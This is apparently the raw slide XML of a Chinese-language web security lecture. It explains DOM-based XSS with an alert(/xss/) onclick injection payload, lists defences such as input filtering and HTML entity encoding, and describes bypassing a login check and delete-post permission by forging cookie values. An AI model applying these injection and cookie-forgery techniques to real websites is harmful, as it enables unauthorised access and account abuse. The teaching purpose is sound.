              <a:t>如果构造数据“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>‘ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>=’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>(/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>/)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>”，那么最后添加的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>代码就变成了“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>=’ ‘ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>=’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>javascript:alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>(/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>/)’&gt;test&lt;/a&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>”，插入一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>onclick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>事件，点击提交按键，那么就会发生一次</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>xss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>攻击。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>式</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="图片 5" descr="dom2"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1965642" y="3757295"/>
            <a:ext cx="4793615" cy="206756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r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="446467" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611188" y="1287463"/>
            <a:ext cx="8151812" cy="4894262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用程序的所有输入进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>过滤</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>，对危险的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>字符进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>编码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘&lt;’ ,  ‘&gt;’  </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  ‘&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>lt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>;’      ,  ‘&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>gt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>;’</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘(‘  ,  ‘)’   </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  ‘&amp;#40;’  ,  ‘&amp;#41;’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>‘#‘ , ‘&amp;’  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>  ‘&amp;#35;’   ,  ‘&amp;#38;‘</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>对用户进行培训，告知小心使用电子邮件消息或即时消息中的链接；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>防止访问已知的恶意网站；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>执行手工或自动化代码扫描，确定并消除潜在的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>漏洞。</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6467">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4464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64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6467">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4464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6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46467">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4464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64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6467">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4464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64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46467">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4464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64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46467">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44646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64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46467">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44646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4646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三、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>欺骗及防范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0377" y="1346345"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>伪造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>信息，绕过网站的验证过程，不需要输入密码，就可以登录网站，甚至进入网站管理后台</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>伪造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>信息</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0377" y="1346345"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>网站登录验证代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>伪造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="125701" y="2154455"/>
            <a:ext cx="5095875" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5528681" y="1668352"/>
            <a:ext cx="3415294" cy="4401205"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>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利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>request.Cookies</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语句分别获取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Cookies</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中的用户名、口令和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>randomid</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的值。如果用户名或口令为空或</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>randomid</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值不等于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>12</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就跳转到登录界面。也就是说，程序是通过验证用户的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Cookie</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信息来确认用户是否已登录。然而，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Cookie</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信息是可以在本地修改的，只要改后的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Cookie</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信息符合验证条件（用户名和口令不空且</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>randomid</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值等于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>12</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），就可进入管理后台界面</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="0" dirty="0">
              <a:ea typeface="黑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00377" y="1346345"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>判断是否有删帖权限的代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>伪造</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>信息</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1381414" y="4953313"/>
            <a:ext cx="5960129" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>只要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>中的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>power</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>值不小于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>500</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>，任意用户都可以删除任意帖子。同样可以利用上面介绍的方法进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="0" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
